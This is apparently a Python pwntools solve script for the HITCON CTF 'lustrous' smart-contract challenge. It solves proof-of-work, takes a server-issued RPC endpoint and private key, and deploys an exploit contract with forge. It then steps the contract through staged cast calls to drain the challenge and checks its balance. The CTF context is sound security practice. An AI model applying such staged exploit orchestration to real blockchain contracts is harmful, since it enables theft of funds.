#!/usr/bin/env python3
from pwn import *
from subprocess import check_output
from os import system


POW_SOLVER = '/home/ubuntu/juno/hitcon/pow_solver/target/release/pow_solver'
context.log_level = 'debug'
# context.log_level = 'error'
HOST = 'lustrous.chal.hitconctf.com'
PORT = 31337
r = remote(HOST, PORT)

r.sendlineafter(b'action?', b'1')
r.recvuntil(b'nao.github.io/tools/solve-pow.py) ')
p_target = r.recvuntil(b' ').strip()
result = check_output([POW_SOLVER, b'24', p_target]).strip()
r.sendline(result)

data = r.recvuntil(b'challenge contract')
data += r.recvline()

RPC_URL = data.split(b'rpc endpoint:')[1].split(b'\n')[0].strip().decode()
RPC_URL = RPC_URL.replace("8545", "8545")
PVKEY = data.split(b'private key:')[1].split(b'\n')[0].strip().decode()
ME = data.split(b'your address:')[1].split(b'\n')[0].strip().decode()
CHALL = data.split(b'challenge contract:')[1].split(b'\n')[0].strip().decode()

UUID = RPC_URL.split("/")[-1].strip()
print(RPC_URL)
print(PVKEY)
print(ME)
print(CHALL)

#########################

block = check_output(f"cast block-number --rpc-url {RPC_URL}", shell=True)
print('block', block)

system(f"cast block 2 --rpc-url {RPC_URL}")

from time import sleep
####### DEPLOY THE GEM >= 200 #########
cmd = f"CHALL={CHALL} forge script --fork-url {RPC_URL} --private-key {PVKEY} ./script/Counter.s.sol:XS1 -vvvv --broadcast"# --skip-simulation"
# TEST
# cmd = f"CHALL={CHALL} forge script --fork-url {RPC_URL} --private-key {PVKEY} ./script/Counter.s.sol:CounterScript -vvvv"# --skip-simulation"

print(cmd)
out = check_output(cmd, shell=True)
exp_address = out.split(b'exp address')[1].split(b'\n')[0].strip().decode().split("[")[1].split("]")[0]
print('exp', exp_address)

while True:
    block = check_output(f"cast block-number --rpc-url {RPC_URL}", shell=True)
    print('block', block)
    if int(block) == 5:
        cmd = f"cast send --rpc-url {RPC_URL} --private-key {PVKEY} {exp_address} --value '1ether' 'stage1(address)' {CHALL}"# --skip-simulation"
        print(cmd)
        system(cmd)
        break
    else:
        sleep(0.5)

#####################
r.close()

for i in range(32):
    r = remote(HOST, PORT)
    r.sendlineafter(b'action?', b'3')
    r.recvuntil(b'nao.github.io/tools/solve-pow.py) ')
    p_target = r.recvuntil(b' ').strip()
    result = check_output([POW_SOLVER, b'20', p_target]).strip()
    r.sendline(result)
    r.sendlineafter(b'uuid please:', UUID.encode())
    data = r.recvuntil(b'tx hash')
    print('s1', data)
    if b'x status: 1' in data:
        print("GOOD")
        break

cmd = f"cast send --rpc-url {RPC_URL} --private-key {PVKEY} {exp_address} 'set_stage(uint256)' 1"# --skip-simulation"
system(cmd)

# init again
for i in range(32):
    r = remote(HOST, PORT)
    r.sendlineafter(b'action?', b'3')
    r.recvuntil(b'nao.github.io/tools/solve-pow.py) ')
    p_target = r.recvuntil(b' ').strip()
    result = check_output([POW_SOLVER, b'20', p_target]).strip()
    r.sendline(result)
    r.sendlineafter(b'uuid please:', UUID.encode())
    data = r.recvuntil(b'tx hash')
    data += r.recvline()
    print('s2', data)
    if b'x status: 1' in data:
        print("GOOD")
        break

cmd = f"cast call --rpc-url {RPC_URL} {CHALL} 'stage() returns (uint8)'"# --skip-simulation"
print(cmd)
system(cmd)



cmd = f"cast send --rpc-url {RPC_URL} --private-key {PVKEY} {exp_address} 'set_stage(uint256)' 2"# --skip-simulation"
system(cmd)

cmd = f"cast send --rpc-url {RPC_URL} --private-key {PVKEY} {exp_address} 'assign_gem(uint32)' 1"# --skip-simulation"
system(cmd)

for i in range(32):
    # make it INACTIVE
    r = remote(HOST, PORT)
    r.sendlineafter(b'action?', b'3')
    r.recvuntil(b'nao.github.io/tools/solve-pow.py) ')
    p_target = r.recvuntil(b' ').strip()
    result = check_output([POW_SOLVER, b'20', p_target]).strip()
    r.sendline(result)
    r.sendlineafter(b'uuid please:', UUID.encode())
    data = r.recvuntil(b'tx hash')
    print('s3', data)
    if b'x status: 1' in data:
        print("GOOD")
        break

cmd = f"cast call --rpc-url {RPC_URL} {exp_address} 'get_gem(uint32) returns (int256,int256,int256,int256,uint256)' 0"# --skip-simulation"
print(cmd)
system(cmd)

cmd = f"cast call --trace --rpc-url {RPC_URL} {exp_address} 'get_gem(uint32) returns (int256,int256,int256,int256,uint256)' 1"# --skip-simulation"
print(cmd)
system(cmd)

input("?")

cmd = f"cast send --rpc-url {RPC_URL} --private-key {PVKEY} {exp_address} 'assign_gem(uint32)' 0"# --skip-simulation"
system(cmd)

cmd = f"cast send --rpc-url {RPC_URL} --private-key {PVKEY} {exp_address} 'set_stage(uint256)' 3"# --skip-simulation"
system(cmd)

# set stage1 again
for i in range(64):
    r = remote(HOST, PORT)
    r.sendlineafter(b'action?', b'3')
    r.recvuntil(b'nao.github.io/tools/solve-pow.py) ')
    p_target = r.recvuntil(b' ').strip()
    result = check_output([POW_SOLVER, b'20', p_target]).strip()
    r.sendline(result)
    r.sendlineafter(b'uuid please:', UUID.encode())
    data = r.recvuntil(b'tx hash')
    data += r.recvline()
    print('s4', data)
    if b'x status: 1' in data:
        print("GOOD")
        break

cmd = f"cast send --rpc-url {RPC_URL} --private-key {PVKEY} {exp_address} 'set_stage(uint256)' 4"# --skip-simulation"
system(cmd)

# merge
for i in range(32):
    r = remote(HOST, PORT)
    r.sendlineafter(b'action?', b'3')
    r.recvuntil(b'nao.github.io/tools/solve-pow.py) ')
    p_target = r.recvuntil(b' ').strip()
    result = check_output([POW_SOLVER, b'20', p_target]).strip()
    r.sendline(result)
    r.sendlineafter(b'uuid please:', UUID.encode())
    data = r.recvuntil(b'tx hash')
    data += r.recvline()
    print('s5', data)
    if b'x status: 1' in data:
        print("GOOD")
        break

cmd = f"cast send --rpc-url {RPC_URL} --private-key {PVKEY} {exp_address} 'set_stage(uint256)' 5"# --skip-simulation"
system(cmd)

r = remote(HOST, PORT)
r.sendlineafter(b'action?', b'3')
r.recvuntil(b'nao.github.io/tools/solve-pow.py) ')
p_target = r.recvuntil(b' ').strip()
result = check_output([POW_SOLVER, b'20', p_target]).strip()
r.sendline(result)
r.sendlineafter(b'uuid please:', UUID.encode())
data = r.recvuntil(b'tx hash')
data += r.recvline()
print('final', data)
if b'x status: 1' in data:
    print("GOOD")

cmd = f"cast balance --rpc-url {RPC_URL} {CHALL}"# --skip-simulation"
print(cmd)
system(cmd)